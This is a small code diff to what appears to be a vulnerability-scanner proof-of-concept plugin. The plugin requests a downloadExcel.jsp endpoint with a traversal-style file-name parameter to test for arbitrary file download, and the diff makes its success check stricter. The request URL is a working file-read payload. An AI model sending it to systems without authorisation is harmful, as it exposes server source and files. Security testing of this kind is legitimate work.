@@ -33,7 +33,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + '/download/downloadExcel.jsp?excelName=.%2Fdownload%2FdownloadExcel.jsp&downloadId=1677'
             response = requests.get(vul_url)
-            if response.status_code ==200:
+            if response.status_code == 200 and 'downloadExcel.jsp' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
 
         except Exception, e:
